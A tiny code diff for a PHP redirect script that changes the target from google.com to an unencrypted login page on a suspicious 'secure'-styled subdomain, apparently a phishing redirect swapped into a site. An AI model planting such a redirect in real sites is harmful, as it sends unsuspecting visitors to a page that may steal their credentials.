@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: https://google.com"); 
+header("Location: http://01secure02securebag03.otzo.com/login"); 
   
 exit; 
 ?> 
